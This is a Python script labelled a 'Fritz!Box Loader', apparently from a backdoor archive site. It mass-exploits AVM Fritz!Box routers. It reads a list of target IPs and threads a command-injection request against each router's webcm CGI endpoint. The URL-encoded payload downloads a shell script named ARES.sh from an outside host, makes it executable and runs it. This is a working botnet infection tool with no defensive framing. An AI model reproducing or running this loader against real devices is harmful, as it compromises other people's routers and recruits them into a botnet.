#!/usr/bin/python
#Fritz!Box Loader Downloaded by B4CKDOOR | B4CKDOORARCHIVE.HOST

import threading, sys, time, socket, requests
from threading import Thread
from time import sleep
import requests
from requests.auth import HTTPDigestAuth
from decimal import *
ips = open(sys.argv[1], "r").readlines()

payload = "%26%20wget%20http%3A%2F%2F1.1.1%2FARES.sh%3B%20chmod%20777%20ARES.sh%3B%20sh%20ARES.sh%20%26"

class load(threading.Thread):
  def __init__ (self, ip):
    threading.Thread.__init__(self)
    self.ip = str(ip).rstrip('\n')
  def run(self):
    try:
      url = 'https://'+self.ip+'/cgi-bin/webcm?getpage=../html/menus/menu2.html&var:lang='+payload
      requests.get(url, timeout=5)
      print("[Fritz!Box] Loading - " + self.ip)
    except Exception as e:
      pass

for ip in ips:
  try:
    n = load(ip)
    n.start()
  except:
    pass